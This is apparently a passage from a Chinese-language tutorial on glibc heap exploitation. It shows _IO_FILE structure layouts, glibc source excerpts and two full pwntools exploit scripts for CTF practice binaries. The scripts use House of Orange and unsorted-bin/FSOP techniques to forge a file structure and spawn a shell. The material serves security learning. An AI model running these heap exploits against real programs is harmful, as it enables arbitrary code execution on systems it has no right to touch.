&#123;</span><br><span class="hljs-comment">/*    0      |     4 */</span>    <span class="hljs-type">int</span> _flags;<br><span class="hljs-comment">/* XXX  4-byte hole  */</span><br><span class="hljs-comment">/*    8      |     8 */</span>    <span class="hljs-type">char</span> *_IO_read_ptr;<br><span class="hljs-comment">/*   16      |     8 */</span>    <span class="hljs-type">char</span> *_IO_read_end;<br><span class="hljs-comment">/*   24      |     8 */</span>    <span class="hljs-type">char</span> *_IO_read_base;<br><span class="hljs-comment">/*   32      |     8 */</span>    <span class="hljs-type">char</span> *_IO_write_base;<br><span class="hljs-comment">/*   40      |     8 */</span>    <span class="hljs-type">char</span> *_IO_write_ptr;<br><span class="hljs-comment">/*   48      |     8 */</span>    <span class="hljs-type">char</span> *_IO_write_end;<br><span class="hljs-comment">/*   56      |     8 */</span>    <span class="hljs-type">char</span> *_IO_buf_base;<br><span class="hljs-comment">/*   64      |     8 */</span>    <span class="hljs-type">char</span> *_IO_buf_end;<br><span class="hljs-comment">/*   72      |     8 */</span>    <span class="hljs-type">char</span> *_IO_save_base;<br><span class="hljs-comment">/*   80      |     8 */</span>    <span class="hljs-type">char</span> *_IO_backup_base;<br><span class="hljs-comment">/*   88      |     8 */</span>    <span class="hljs-type">char</span> *_IO_save_end;<br><span class="hljs-comment">/*   96      |     8 */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><span class="hljs-comment">/*  104      |     8 */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><span class="hljs-comment">/*  112      |     4 */</span>    <span class="hljs-type">int</span> _fileno;<br><span class="hljs-comment">/*  116      |     4 */</span>    <span class="hljs-type">int</span> _flags2;<br><span class="hljs-comment">/*  120      |     8 */</span>    <span class="hljs-type">__off_t</span> _old_offset;<br><span class="hljs-comment">/*  128      |     2 */</span>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br><span class="hljs-comment">/*  130      |     1 */</span>    <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br><span class="hljs-comment">/*  131      |     1 */</span>    <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><span class="hljs-comment">/* XXX  4-byte hole  */</span><br><span class="hljs-comment">/*  136      |     8 */</span>    _IO_lock_t *_lock;<br><span class="hljs-comment">/*  144      |     8 */</span>    <span class="hljs-type">__off64_t</span> _offset;<br><span class="hljs-comment">/*  152      |     8 */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br><span class="hljs-comment">/*  160      |     8 */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br><span class="hljs-comment">/*  168      |     8 */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br><span class="hljs-comment">/*  176      |     8 */</span>    <span class="hljs-type">void</span> *_freeres_buf;<br><span class="hljs-comment">/*  184      |     8 */</span>    <span class="hljs-type">size_t</span> __pad5;<br><span class="hljs-comment">/*  192      |     4 */</span>    <span class="hljs-type">int</span> _mode;<br><span class="hljs-comment">/*  196      |    20 */</span>    <span class="hljs-type">char</span> _unused2[<span class="hljs-number">20</span>];<br><br>                           <span class="hljs-comment">/* total size (bytes):  216 */</span><br>                         &#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; dt <span class="hljs-string">&quot;struct _IO_FILE&quot;</span><br>pwndbg&gt; dt  FILE<br>FILE<br>    +<span class="hljs-number">0x0000</span> _flags               : <span class="hljs-type">int</span><br>    +<span class="hljs-number">0x0008</span> _IO_read_ptr         : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0010</span> _IO_read_end         : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0018</span> _IO_read_base        : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0020</span> _IO_write_base       : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0028</span> _IO_write_ptr        : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0030</span> _IO_write_end        : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0038</span> _IO_buf_base         : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0040</span> _IO_buf_end          : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0048</span> _IO_save_base        : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0050</span> _IO_backup_base      : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0058</span> _IO_save_end         : <span class="hljs-type">char</span> *<br>    +<span class="hljs-number">0x0060</span> _markers             : <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *</span><br><span class="hljs-class">    +0<span class="hljs-title">x0068</span> _<span class="hljs-title">chain</span>               :</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *</span><br><span class="hljs-class">    +0<span class="hljs-title">x0070</span> _<span class="hljs-title">fileno</span>              :</span> <span class="hljs-type">int</span><br>    +<span class="hljs-number">0x0074</span> _flags2              : <span class="hljs-type">int</span><br>    +<span class="hljs-number">0x0078</span> _old_offset          : <span class="hljs-type">__off_t</span><br>    +<span class="hljs-number">0x0080</span> _cur_column          : <span class="hljs-type">short</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span><br>    +<span class="hljs-number">0x0082</span> _vtable_offset       : <span class="hljs-type">signed</span> <span class="hljs-type">char</span><br>    +<span class="hljs-number">0x0083</span> _shortbuf            : <span class="hljs-type">char</span> [<span class="hljs-number">1</span>]<br>    +<span class="hljs-number">0x0088</span> _lock                : _IO_lock_t *<br>    +<span class="hljs-number">0x0090</span> _offset              : <span class="hljs-type">__off64_t</span><br>    +<span class="hljs-number">0x0098</span> _codecvt             : <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *</span><br><span class="hljs-class">    +0<span class="hljs-title">x00a0</span> _<span class="hljs-title">wide_data</span>           :</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *</span><br><span class="hljs-class">    +0<span class="hljs-title">x00a8</span> _<span class="hljs-title">freeres_list</span>        :</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *</span><br><span class="hljs-class">    +0<span class="hljs-title">x00b0</span> _<span class="hljs-title">freeres_buf</span>         :</span> <span class="hljs-type">void</span> *<br>    +<span class="hljs-number">0x00b8</span> __pad5               : <span class="hljs-type">size_t</span><br>    +<span class="hljs-number">0x00c0</span> _mode                : <span class="hljs-type">int</span><br>    +<span class="hljs-number">0x00c4</span> _unused2             : <span class="hljs-type">char</span> [<span class="hljs-number">20</span>]<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; p _IO_list_all<br>$<span class="hljs-number">2</span> = (<span class="hljs-keyword">struct</span> _IO_FILE_plus *) <span class="hljs-number">0x7ffff7f775c0</span> &lt;_IO_2_1_stderr_&gt;<br>pwndbg&gt; dt <span class="hljs-string">&quot;struct _IO_FILE_plus&quot;</span><br><span class="hljs-keyword">struct</span> _IO_FILE_plus<br>    +<span class="hljs-number">0x0000</span> file                 : FILE<br>    +<span class="hljs-number">0x00d8</span> vtable               : <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; dt <span class="hljs-string">&quot;struct _IO_jump_t&quot;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">    +0<span class="hljs-title">x0000</span> __<span class="hljs-title">dummy</span>              :</span> <span class="hljs-type">size_t</span><br>    +<span class="hljs-number">0x0008</span> __dummy2             : <span class="hljs-type">size_t</span><br>    +<span class="hljs-number">0x0010</span> __finish             : _IO_finish_t<br>    +<span class="hljs-number">0x0018</span> __overflow           : _IO_overflow_t<br>    +<span class="hljs-number">0x0020</span> __underflow          : _IO_underflow_t<br>    +<span class="hljs-number">0x0028</span> __uflow              : _IO_underflow_t<br>    +<span class="hljs-number">0x0030</span> __pbackfail          : _IO_pbackfail_t<br>    +<span class="hljs-number">0x0038</span> __xsputn             : _IO_xsputn_t<br>    +<span class="hljs-number">0x0040</span> __xsgetn             : _IO_xsgetn_t<br>    +<span class="hljs-number">0x0048</span> __seekoff            : _IO_seekoff_t<br>    +<span class="hljs-number">0x0050</span> __seekpos            : _IO_seekpos_t<br>    +<span class="hljs-number">0x0058</span> __setbuf             : _IO_setbuf_t<br>    +<span class="hljs-number">0x0060</span> __sync               : _IO_sync_t<br>    +<span class="hljs-number">0x0068</span> __doallocate         : _IO_doallocate_t<br>    +<span class="hljs-number">0x0070</span> __read               : _IO_read_t<br>    +<span class="hljs-number">0x0078</span> __write              : _IO_write_t<br>    +<span class="hljs-number">0x0080</span> __seek               : _IO_seek_t<br>    +<span class="hljs-number">0x0088</span> __close              : _IO_close_t<br>    +<span class="hljs-number">0x0090</span> __stat               : _IO_stat_t<br>    +<span class="hljs-number">0x0098</span> __showmanyc          : _IO_showmanyc_t<br>    +<span class="hljs-number">0x00a0</span> __imbue              : _IO_imbue_t<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;_chain)<br>   &#123;<br>     run_fp = fp;<br>     <span class="hljs-keyword">if</span> (do_lock)<br>_IO_flockfile (fp);<br><br>     <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>   )<br>  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>result = EOF;<br><br>     <span class="hljs-keyword">if</span> (do_lock)<br>_IO_funlockfile (fp);<br>     run_fp = <span class="hljs-literal">NULL</span>;<br>   &#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">          <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>          <span class="hljs-keyword">if</span> (size == nb)<br>            &#123;<br>              set_inuse_bit_at_offset (victim, size);<br>              <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>set_non_main_arena (victim);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>      <span class="hljs-comment">/* Fill cache first, return to user only if cache fills.</span><br><span class="hljs-comment"> We may return one of these chunks later.  */</span><br>      <span class="hljs-keyword">if</span> (tcache_nb<br>  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)<br>&#123;<br>  tcache_put (victim, tc_idx);<br>  return_cached = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">continue</span>;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>            &#125;<br></code></pre></td></tr></table></figure><h4 id="示例一-house-of-orange"><a href="#示例一-house-of-orange" class="headerlink" title="示例一  house_of_orange"></a>示例一  house_of_orange</h4><blockquote><p>文件详见 <a href="attachment%5Chouse_of_orange%5Chouse_of_orange">house_of_orange</a></p></blockquote><h5 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;house_of_orange&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">set breakpoint pending on</span><br><span class="hljs-string">break _IO_flush_all_lockp</span><br><span class="hljs-string">enable breakpoints once 1</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Select the &quot;malloc (small)&quot; option.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">small_malloc</span>():<br>    io.send(<span class="hljs-string">b&quot;1&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Select the &quot;malloc (large)&quot; option.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">large_malloc</span>():<br>    io.sendthen(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;2&quot;</span>)<br><br><span class="hljs-comment"># Select the &quot;edit (1st small chunk)&quot; option; send data.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">data</span>):<br>    io.send(<span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br>io = start()<br><br><span class="hljs-comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;puts() @ &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>) - libc.sym.puts<br><br><span class="hljs-comment"># This binary leaks the heap start address.</span><br>io.recvuntil(<span class="hljs-string">b&quot;heap @ &quot;</span>)<br>heap = <span class="hljs-built_in">int</span>(io.recvline(), <span class="hljs-number">16</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br><br><span class="hljs-comment"># =-=-=- EXAMPLE -=-=-=</span><br><br><span class="hljs-comment"># Request a small chunk.</span><br>small_malloc()<br><br><span class="hljs-comment"># Edit the 1st small chunk.</span><br>edit(<span class="hljs-string">b&quot;Y&quot;</span>*<span class="hljs-number">24</span>+p64(<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x20</span> + <span class="hljs-number">1</span>))<br>large_malloc()<br><span class="hljs-comment"># edit(b&quot;Y&quot;*24 + p64(0x21) + p64(0))</span><br><span class="hljs-comment"># edit(b&quot;Y&quot;*24 + p64(0x21) + p64(0) + p64(libc.sym._IO_list_all - 0x10))</span><br><span class="hljs-comment"># small_malloc()</span><br><br><span class="hljs-comment"># IO_FILE</span><br>flags = <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span><br>size = <span class="hljs-number">0x61</span><br>fd = <span class="hljs-number">0</span><br>bk = libc.sym._IO_list_all - <span class="hljs-number">0x10</span><br><br>write_base = <span class="hljs-number">0x1</span><br>write_ptr = <span class="hljs-number">0x2</span><br>mode =  <span class="hljs-number">0x0</span><br>vtable_ptr = heap + <span class="hljs-number">0xd8</span><br>overflow = libc.sym.system<br><br>fake_io_file = flags + p64(size) +\<br>    p64(fd) + p64(bk) +\<br>    p64(write_base) + p64(write_ptr) +\<br>    p64(<span class="hljs-number">0</span>)*<span class="hljs-number">18</span> + p32(mode) + p32(<span class="hljs-number">0</span>) +\<br>    p64(<span class="hljs-number">0</span>) + p64(overflow) +p64(vtable_ptr)<br><br><br>edit(<span class="hljs-string">b&quot;X&quot;</span>*<span class="hljs-number">16</span> + fake_io_file)<br><br>small_malloc()<br><br><span class="hljs-comment"># =============================================================================</span><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="示例二-one-byte"><a href="#示例二-one-byte" class="headerlink" title="示例二 one_byte"></a>示例二 one_byte</h4><blockquote><p>文件详见 <a href="attachment%5Cone_byte%5Cone_byte">one_byte</a></p></blockquote><h5 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = context.binary = ELF(<span class="hljs-string">&quot;one_byte&quot;</span>)<br>libc = ELF(elf.runpath + <span class="hljs-string">b&quot;/libc.so.6&quot;</span>) <span class="hljs-comment"># elf.libc broke again</span><br><br>gs = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>():<br>    <span class="hljs-keyword">if</span> args.GDB:<br>        <span class="hljs-keyword">return</span> gdb.debug(elf.path, gdbscript=gs)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> process(elf.path)<br><br><span class="hljs-comment"># Index of allocated chunks.</span><br>index = <span class="hljs-number">0</span><br><br><span class="hljs-comment"># Select the &quot;malloc&quot; option.</span><br><span class="hljs-comment"># Returns chunk index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>():<br>    <span class="hljs-keyword">global</span> index<br>    io.sendthen(<span class="hljs-string">b&quot;&gt; &quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>)<br>    index += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> index - <span class="hljs-number">1</span><br><br><span class="hljs-comment"># Select the &quot;free&quot; option; send index.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;2&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Select the &quot;edit&quot; option; send index &amp; data.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, data</span>):<br>    io.send(<span class="hljs-string">b&quot;3&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    io.sendafter(<span class="hljs-string">b&quot;data: &quot;</span>, data)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br><br><span class="hljs-comment"># Select the &quot;read&quot; option; read 0x58 bytes.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">index</span>):<br>    io.send(<span class="hljs-string">b&quot;4&quot;</span>)<br>    io.sendafter(<span class="hljs-string">b&quot;index: &quot;</span>, <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;index&#125;</span>&quot;</span>.encode())<br>    r = io.recv(<span class="hljs-number">0x58</span>)<br>    io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>    <span class="hljs-keyword">return</span> r<br><br>io = start()<br>io.recvuntil(<span class="hljs-string">b&quot;&gt; &quot;</span>)<br>io.timeout = <span class="hljs-number">0.1</span><br><br><span class="hljs-comment"># =============================================================================</span><br>chunk_A = malloc()<br>chunk_B = malloc()<br>chunk_C = malloc()<br>chunk_D = malloc()<br>chunk_E = malloc()<br><br><span class="hljs-comment"># overlap</span><br>edit(chunk_A, <span class="hljs-string">b&#x27;Y&#x27;</span>*<span class="hljs-number">88</span> + p8(<span class="hljs-number">0xc1</span>))<br><br><span class="hljs-comment"># leak libc</span><br>free(chunk_B)<br>chunk_B = malloc()<br><br>data = read(chunk_C)<br>unsortedbin_address = u64(data[:<span class="hljs-number">8</span>])<br>info(<span class="hljs-string">f&quot;unsortedbin_address -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(unsortedbin_address)&#125;</span>&quot;</span>)<br>libc.address = unsortedbin_address - <span class="hljs-number">0x58</span> - libc.sym.main_arena<br>info(<span class="hljs-string">f&quot;libc base -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc.address)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># leak heap</span><br>chunk_C2 = malloc()<br>free(chunk_A)<br>free(chunk_C2)<br><br>heap = u64(read(chunk_C)[:<span class="hljs-number">8</span>])<br>info(<span class="hljs-string">f&quot;heap base -&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(heap)&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># unsortedbin</span><br>chunk_C2 = malloc()<br>chunk_A = malloc()<br>edit(chunk_A, <span class="hljs-string">b&quot;Y&quot;</span>*<span class="hljs-number">88</span> + p8(<span class="hljs-number">0xc1</span>))<br><span class="hljs-comment"># edit(chunk_A, b&quot;Y&quot;*88 + p8(0x68))</span><br>free(chunk_B)<br>chunk_B = malloc()<br><br><span class="hljs-comment"># unsortedbin again and IO_File</span><br>edit(chunk_B, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">10</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p8(<span class="hljs-number">0xb1</span>))<br>edit(chunk_C, p64(<span class="hljs-number">0</span>) + p64(libc.sym._IO_list_all - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>))<br>edit(chunk_E, p64(libc.sym.system) + p64(heap + <span class="hljs-number">0x178</span>))<br><br>malloc()<br><br><span class="hljs-comment">#  =============================================================================</span><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h3><h3 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h3><h3 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h3><h3 